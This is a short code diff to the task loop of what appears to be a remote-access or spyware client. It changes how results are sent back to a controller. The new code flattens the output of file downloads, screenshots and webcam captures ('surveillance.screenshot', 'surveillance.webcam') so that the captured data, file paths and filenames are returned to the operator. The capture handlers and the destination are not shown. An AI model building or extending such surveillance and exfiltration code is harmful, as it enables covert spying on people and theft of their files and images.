@@ -189,13 +189,29 @@ def run_task(task):
             result = task_handlers[task_type]()
         else:
             result = f"Unknown task type: {task_type}"
-        # Send the result back
-        send_result(task_id, {
-            'status': 'success',
-            'data': result,
-            'timestamp': datetime.now().isoformat(),
-            'type': task_type
-        })
+        # Flatten file/image results for download
+        file_types = [
+            'files.download', 'files_download',
+            'surveillance.screenshot', 'surveillance_screenshot',
+            'surveillance.webcam', 'surveillance_webcam'
+        ]
+        if task_type in file_types and isinstance(result, dict) and 'data' in result:
+            send_result(task_id, {
+                'status': result.get('status', 'success'),
+                'data': result['data'],
+                'format': result.get('format'),
+                'path': result.get('path'),
+                'filename': os.path.basename(result.get('path', '')) if result.get('path') else None,
+                'timestamp': result.get('timestamp', datetime.now().isoformat()),
+                'type': task_type
+            })
+        else:
+            send_result(task_id, {
+                'status': 'success',
+                'data': result,
+                'timestamp': datetime.now().isoformat(),
+                'type': task_type
+            })
     except Exception as e:
         error_msg = f"Task execution failed: {str(e)}"
         tb = traceback.format_exc()
